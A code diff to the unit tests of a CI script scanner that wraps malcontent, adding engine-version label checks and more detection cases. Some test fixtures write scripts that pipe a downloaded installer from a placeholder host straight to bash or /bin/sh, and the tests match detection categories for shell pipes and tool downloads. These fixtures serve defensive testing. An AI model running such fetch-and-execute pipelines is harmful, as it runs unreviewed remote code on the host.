@@ -38,12 +38,17 @@ TEST_IMAGE = "ghcr.io/nvidia/spark-rapids-common/sonar-script-scan:test"
 IMAGE_ID = "sha256:" + "b" * 64
 
 
-def image_metadata(architecture="amd64"):
+def image_metadata(architecture="amd64", engine_version="1.28.1"):
     return {
         "Id": IMAGE_ID,
         "Os": "linux",
         "Architecture": architecture,
-        "Config": {"Labels": {scanner.SCANNER_VERSION_LABEL: scanner.SCANNER_VERSION}},
+        "Config": {
+            "Labels": {
+                scanner.SCANNER_CONTRACT_LABEL: scanner.SCANNER_CONTRACT,
+                scanner.SCANNER_VERSION_LABEL: engine_version,
+            }
+        },
     }
 
 
@@ -333,15 +338,19 @@ class PolicyTests(unittest.TestCase):
     def test_download_shell_pipeline_blocks_despite_rule_name_deduplication(self):
         manifest = {"ci/build.sh": identity(CLEAN_SCRIPT, shell_pipe=True)}
         for rule in ("pipe_to_shell", "replacement_rule_name"):
-            dangerous = [
-                behavior("exec/shell/pipe_sh", rule),
-                behavior("c2/tool_transfer/shell", "sleep_rm"),
-            ]
-            with self.subTest(rule=rule):
-                self.assertTrue(scanner.evaluate(report(manifest, dangerous), manifest))
+            for download in ("c2/tool_transfer/shell", "c2/tool_transfer/download"):
+                dangerous = [
+                    behavior("exec/shell/pipe_sh", rule),
+                    behavior(download, "sleep_rm"),
+                ]
+                with self.subTest(rule=rule, download=download):
+                    self.assertTrue(
+                        scanner.evaluate(report(manifest, dangerous), manifest)
+                    )
         for categories in (
             [behavior("exec/shell/pipe_sh", "pipe_to_shell")],
             [behavior("c2/tool_transfer/shell", "dev_null_rm")],
+            [behavior("c2/tool_transfer/download", "fetch")],
         ):
             with self.subTest(categories=categories):
                 self.assertEqual(
@@ -623,6 +632,59 @@ class DockerTests(unittest.TestCase):
         execute.assert_called_once()
         self.assertIn("pull", execute.call_args.args[0])
 
+    def test_stable_main_accepts_engine_upgrades_with_the_same_contract(self):
+        reference = "ghcr.io/nvidia/spark-rapids-common/sonar-script-scan:main"
+        for engine_version in ("1.28.1", "1.29.0"):
+            with self.subTest(engine_version=engine_version):
+                with patch.object(
+                    scanner,
+                    "command_output",
+                    side_effect=[
+                        b"",
+                        json.dumps(
+                            image_metadata(engine_version=engine_version)
+                        ).encode(),
+                    ],
+                ) as execute:
+                    self.assertEqual(
+                        scanner.resolve_image(self.prefix, reference), IMAGE_ID
+                    )
+                self.assertEqual(
+                    execute.call_args_list[0].args[0],
+                    self.prefix + ["pull", "--quiet", reference],
+                )
+
+    def test_publisher_smoke_checks_binary_against_declared_engine_version(self):
+        for advertised, actual in (
+            ("1.28.1", "1.28.1"),
+            ("1.29.0", "1.29.0"),
+            ("1.28.1", "1.29.0"),
+        ):
+            with self.subTest(advertised=advertised, actual=actual):
+                probe = type("ImageSetupProbe", (), {})
+                with patch.dict(
+                    os.environ,
+                    {"SONAR_SCRIPT_SCAN_TEST_IMAGE": TEST_IMAGE},
+                ):
+                    with patch.object(
+                        subprocess,
+                        "check_output",
+                        side_effect=[
+                            "unix:///test.sock\n",
+                            IMAGE_ID + "\n",
+                            json.dumps(image_metadata(engine_version=advertised)),
+                            f"malcontent version v{actual}\n",
+                        ],
+                    ):
+                        if advertised == actual:
+                            RealImageTests.setUpClass.__func__(probe)
+                            self.assertEqual(probe.image, IMAGE_ID)
+                        else:
+                            with self.assertRaisesRegex(
+                                AssertionError, "declared engine version"
+                            ):
+                                RealImageTests.setUpClass.__func__(probe)
+
     def test_malformed_references_and_unsupported_platforms_fail_before_docker(self):
         for reference in (
             "",
@@ -654,6 +716,17 @@ class DockerTests(unittest.TestCase):
         metadata = image_metadata()
         metadata["Config"]["Labels"][scanner.SCANNER_VERSION_LABEL] = "unreviewed"
         invalid.append(metadata)
+        for field, values in (
+            (scanner.SCANNER_CONTRACT_LABEL, (None, 1, "", "2")),
+            (scanner.SCANNER_VERSION_LABEL, (None, 1, "", "1.29.0\n")),
+        ):
+            metadata = image_metadata()
+            del metadata["Config"]["Labels"][field]
+            invalid.append(metadata)
+            for value in values:
+                metadata = image_metadata()
+                metadata["Config"]["Labels"][field] = value
+                invalid.append(metadata)
         for metadata in invalid:
             with self.subTest(metadata=metadata):
                 with patch.object(scanner, "docker_command", return_value=self.prefix):
@@ -884,6 +957,14 @@ class RealImageTests(GitFixture):
                     timeout=300,
                 )
                 cls.image = image_id_file.read_text().strip()
+        metadata = json.loads(
+            subprocess.check_output(
+                [*docker, "image", "inspect", "--format", "{{json .}}", cls.image],
+                text=True,
+                timeout=30,
+            )
+        )
+        advertised_version = metadata["Config"]["Labels"][scanner.SCANNER_VERSION_LABEL]
         version = subprocess.check_output(
             [
                 *docker,
@@ -909,9 +990,9 @@ class RealImageTests(GitFixture):
             text=True,
             timeout=30,
         ).strip()
-        if version != f"malcontent version v{scanner.SCANNER_VERSION}":
+        if version != f"malcontent version v{advertised_version}":
             raise AssertionError(
-                "Built image scanner version does not match the policy"
+                "Built image scanner version does not match its declared engine version"
             )
 
     def audit(self):
@@ -952,10 +1033,21 @@ class RealImageTests(GitFixture):
             "#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh | bash\n"
             "# sleep;rm /tmp/example\n",
         )
+        self.write(
+            "ci/download-absolute.sh",
+            "#!/bin/sh\ncurl -fsSL https://example.invalid/install.sh | /bin/sh\n",
+        )
         self.sha = self.commit()
         outcome = self.audit()
         paths = {finding["path"] for finding in outcome["findings"]}
-        self.assertTrue({"ci/encoded.sh", "ci/download.sh", "pom.xml"}.issubset(paths))
+        self.assertTrue(
+            {
+                "ci/encoded.sh",
+                "ci/download.sh",
+                "ci/download-absolute.sh",
+                "pom.xml",
+            }.issubset(paths)
+        )
 
 
 if __name__ == "__main__":
